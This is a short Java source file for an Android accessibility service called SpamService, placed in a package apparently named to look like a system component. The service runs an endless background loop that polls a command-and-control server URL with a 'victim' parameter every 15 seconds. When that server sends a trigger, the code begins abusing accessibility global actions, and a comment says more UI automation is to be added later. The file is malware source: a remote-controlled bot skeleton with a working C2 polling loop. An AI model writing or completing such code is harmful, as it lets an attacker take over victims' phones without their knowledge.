package com.compass.system;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpamService extends AccessibilityService {
    private boolean isSpamming = false;
    private static final String C2_URL = "https://malbot-c2.onrender.com/get?victim=test";

    @Override
    public void onServiceConnected() {
        new Thread(() -> {
            while (true) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(C2_URL).openConnection();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = reader.readLine();
                    reader.close();
                    if (response != null && response.contains("\"1\":1")) {
                        if (!isSpamming) {
                            isSpamming = true;
                            startSpam();
                        }
                    } else {
                        isSpamming = false;
                    }
                    Thread.sleep(15000);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void startSpam() {
        performGlobalAction(GLOBAL_ACTION_BACK);
        // Add UI Automation here later
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override
    public void onInterrupt() {}
}
